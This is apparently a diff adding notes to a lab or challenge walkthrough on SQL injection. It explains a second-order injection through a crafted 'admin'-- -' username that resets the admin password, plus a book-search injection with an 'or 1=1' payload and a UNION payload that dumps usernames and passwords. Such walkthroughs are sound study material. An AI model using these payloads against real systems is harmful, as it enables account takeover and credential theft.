@@ -502,6 +502,30 @@ sqlmap --tamper tamper/so-tamper.py --url http://10.10.1.134:5000/challenge4/sig
 
                                     
 
+                                                  CHANGE PASSWORD
+The developer has used a placeholder for the password parameter because this input comes directly from the user.
+The username does not come directly from the user but is rather fetched from the database based on the user id stored in the session object. Therefore, the developer has thought that the username was safe to use and concatenated it directly into the query instead of using a placeholder:                                                 
+
+UPDATE users SET password = ? WHERE username = '" + username + "'
+
+To exploit this vulnerability and gain access to the admin's user account, we can create a user with the name 
+-----> admin'-- -
+
+After having registered the malicious user, we can update the password for our new user to trigger the vulnerability.
+When changing the password, the application executes two queries. First, it asks the database for the username and password for our current user:
+-------> SELECT username, password FROM users WHERE id = ?
+
+If all checks are fine, it will try to update the password for our user. Since the username gets concatenated directly into the SQL query, the executed query will look as follows:
+--------> UPDATE users SET password = ? WHERE username = 'admin' -- -'
+
+The web page performs a GET request with the parameter title when searching for a book. The query it performs can be seen here:
+-------> SELECT * from books WHERE id = (SELECT id FROM books WHERE title like '" + title + "%')
+--------> ') or 1=1-- -
+
+') union select 1,group_concat(username),group_concat(password),4 from users-- -
+
+
+
 
 
 
